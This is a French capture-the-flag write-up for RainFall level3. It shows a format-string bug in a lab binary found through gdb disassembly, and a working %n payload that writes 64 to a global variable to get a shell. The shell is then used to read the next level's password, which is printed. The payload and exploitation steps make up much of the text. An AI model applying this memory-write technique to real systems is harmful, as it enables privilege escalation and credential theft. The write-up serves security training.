# Level 3

## 1. Ce que le programme fait

```bash
level3@RainFall:~$ ./level3
test
test
```

- Le programme lit l'input et l'affiche.

## 2. Trouver la vulnérabilité

- Un test avec un format specifier classique nous donnes:

```bash
level3@RainFall:~$ ./level3
%p
0x200
level3@RainFall:~$ ./level3
%d
512
level3@RainFall:~$ ./level3
%x
200
```

- Vulnérabilité: Le programme a interprété %pdx, et affiche une valeur mémoire 

- Le programme passe directement notre entrée à `printf()` sans formatage sécurisé.

## 3. Comprendre le code

```bash
gdb level3
```

```bash
(gdb) disas main
```

- Le main appelle une fonction v():

```bash
(gdb) disas v
```

- points importants de l'assembleur:

```bash
0x080484e2 <+62>:  jne    0x8048518 <v+116>      # Jump if Not Equal
0x080484c7 <+35>:  call   0x80483a0 <fgets@plt>  # Lit 0x200 bytes
0x080484d5 <+49>:  call   0x8048390 <printf@plt> # [vulnérabilité ici]
0x080484da <+54>:  mov    0x804988c,%eax         # Charge une variable globale
0x080484df <+59>:  cmp    $0x40,%eax             # Compare EAX avec 64 (0x40)
0x080484e2 <+62>:  jne    0x8048518 <v+116>      # Si != 64, on sort
0x08048513 <+111>: call   0x80483c0 <system@plt> # Sinon: appel system() (shell)
```

- Ce qu'on comprend:
1. fgets() lit notre entrée dans un buffer
2. printf() l'affiche directement
3. Le programme vérifie si la valeur à l'adresse 0x804988c vaut 64 (0x40)
4. Si oui: il appelle system("/bin/sh") 

## 4. Objectif: Écrire 64 à l'adresse 0x804988c

- La vulnérabilité format string permet d'écrire en mémoire avec %n

- Comment fonctionne %n?
- %n écrit le nombre de caractères déjà affichés à l'adresse pointée par l'argument suivant
- ex: printf("AAAA%n", &variable); écrit 4 dans variable

- Notre stratégie:
1. Placer l'adresse cible 0x804988c dans le buffer
2. Trouver à quelle position elle se trouve sur la stack
3. Utiliser %n pour écrire 64 à cette adresse

## 5. Etape 1: Placer l'adresse cible dans le buffer

- On écrit l'adresse en little-endian:

```python
addr = "\x8c\x98\x04\x08"
```

## 6. Etape 2: Trouver la position de notre adresse sur la stack

- On envoie l'adresse suivie de plusieurs %p pour explorer la stack:

```bash
python -c 'print("\x8c\x98\x04\x08" + "%p %p %p %p %p")' | ./level3
�0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x25207025
```

- 0x804988c apparaît en 4eme position
- On peut donc utiliser %4$n pour écrire directement à cette adresse

## 7. Etape 3: Écrire exactement 64

- %n écrit le nombre de caractères déjà affichés
- On a déjà 4 octets (l'adresse)
- Il nous en faut 60 de plus pour atteindre 64

- On va utiliser %Xd pour afficher X caractères:

```python
payload = "\x8c\x98\x04\x08" + "%60d" + "%4$n"
```

- \x8c\x98\x04\x08: 4 chars (l'adresse)
- %60d: affiche un nombre sur 60 chars
- %4$n: écrit le compteur de caractères (64) à l'adresse trouvée en position 4 de la stack

## 8. Exploitation

```bash
(python -c 'print("\x8c\x98\x04\x08" + "%60d" + "%4$n")'; cat) | ./level3
�                                                         512
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
